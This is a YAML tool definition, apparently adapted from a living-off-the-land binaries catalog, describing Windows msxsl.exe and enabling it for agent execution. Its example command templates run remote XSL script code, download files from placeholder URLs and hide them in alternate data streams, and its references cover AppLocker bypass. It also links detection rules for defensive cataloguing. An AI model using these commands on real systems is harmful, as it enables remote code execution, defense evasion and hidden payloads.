---
id: windows-execution-msxsl
namespace: windows:execution:msxsl
name: msxsl
description: 'Command line utility used to perform XSL transformations. Located at: no default.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- security.defense-evasion.bypass
- network.transfer.download
- system.file.alternate-data-stream
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- msxsl
parameters: []
features: []
execution:
  template: msxsl
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Run COM Scriptlet code within the script.xsl file (local). (Local execution of script stored in XSL file.)
  command: msxsl.exe {PATH:.xml} {PATH:.xsl}
- description: Run COM Scriptlet code within the script.xsl file (local). (Local execution of script stored in XSL file.)
  command: msxsl.exe {PATH:.xml} {PATH:.xsl}
- description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote). (Local execution of remote script stored in XSL script stored as an XML file.)
  command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
- description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote). (Local execution of remote script stored in XSL script stored as an XML file.)
  command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
- description: Using remote XML and XSL files, save the transformed XML file to disk. (Download a file from the internet and save it to disk.)
  command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
- description: Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS). (Download a file from the internet and save it to an NTFS Alternate Data Stream.)
  command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
references:
- label: '877616321747271680'
  url: https://twitter.com/subTee/status/877616321747271680
- label: Use-msxsl-to-bypass-AppLocker
  url: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
- label: Use-msxsl-to-download-file
  url: https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file
techniques:
- execution
- defense-evasion
- exfiltration
mitre_ids:
- T1220
- T1105
- T1564
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
install:
- method: choco
  package_name: msxsl
  commands:
  - choco install msxsl
---


# msxsl

msxsl is a Windows LOLBin. Command line utility used to perform XSL transformations. Located at: no default.
